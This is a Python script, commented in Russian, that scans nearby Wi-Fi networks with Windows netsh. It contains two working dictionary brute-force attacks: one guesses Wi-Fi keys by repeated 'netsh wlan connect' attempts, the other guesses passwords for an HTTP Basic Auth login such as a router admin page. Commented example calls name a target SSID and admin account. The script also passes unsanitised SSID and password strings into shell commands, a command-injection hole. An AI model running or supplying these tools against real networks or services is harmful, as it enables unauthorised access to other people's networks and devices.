import subprocess
import time
import requests
from requests.auth import HTTPBasicAuth

# ==================== Анализатор Wi-Fi ====================

def analyze_wifi():
    """Сканирует доступные сети Wi-Fi и выводит их список с сигналом."""
    print("[*] Сканирование доступных сетей Wi-Fi...")
    cmd = "netsh wlan show networks mode=bssid"
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, shell=True, encoding='cp866')
        print(result.stdout)
    except Exception as e:
        print(f"Ошибка при сканировании: {e}")

# ================= Проверка конфигурации Wi-Fi =================

def check_wifi_configuration():
    """Показывает статус текущего подключения и его настройки."""
    print("[*] Проверка конфигурации текущего подключения...")
    cmd = "netsh wlan show interfaces"
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, shell=True, encoding='cp866')
        print(result.stdout)
    except Exception as e:
        print(f"Ошибка при проверке конфигурации: {e}")

# ================= Брутфорс паролей Wi-Fi =================

def check_wifi_password(ssid, password):
    """Команда для подключения к Wi-Fi в Windows"""
    cmd = f'netsh wlan connect name="{ssid}" keymaterial="{password}" interface="Wi-Fi"'
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, shell=True, encoding='cp866')
        if "Подключение выполнено успешно" in result.stdout:
            return True
        return False
    except Exception as e:
        print(f"Ошибка при выполнении команды: {e}")
        return False

def brute_force_wifi(ssid, wordlist_path):
    print(f"Запуск брутфорса для сети: {ssid}...")
    with open(wordlist_path, 'r', encoding='utf-8') as file:
        passwords = file.read().splitlines()
    
    for password in passwords:
        print(f"Проверка пароля: {password}")
        success = check_wifi_password(ssid, password)
        if success:
            print(f"[+] Успех! Пароль найден: {password}")
            return password
        time.sleep(2)  # Задержка между попытками
    
    print("[-] Пароль не найден в данном словаре.")
    return None

# ================= Брутфорс веб-сервиса (HTTP Basic Auth) =================

def test_web_service(url, username, password):
    try:
        response = requests.get(url, auth=HTTPBasicAuth(username, password), timeout=5)
        if response.status_code == 200:
            return True
    except requests.exceptions.RequestException:
        pass
    return False

def brute_force_service(url, username, wordlist_path):
    with open(wordlist_path, 'r', encoding='utf-8') as file:
        passwords = file.read().splitlines()
        
    for pwd in passwords:
        print(f"Проверка: {pwd}")
        if test_web_service(url, username, pwd):
            print(f"[+] Найден пароль для {username}: {pwd}")
            break
        time.sleep(1)

# ================= Пример использования =================

if __name__ == "__main__":
    # 1. Анализ сетей вокруг вас
    analyze_wifi()
    
    # 2. Проверка текущего подключения
    check_wifi_configuration()
    
    # 3. Примеры брутфорса (раскомментируйте для использования)
    # target_ssid = "MyHomeWiFi"
    # wordlist = "passwords.txt"
    # brute_force_wifi(target_ssid, wordlist)
    # brute_force_service("http://192.168.1", "admin", wordlist)
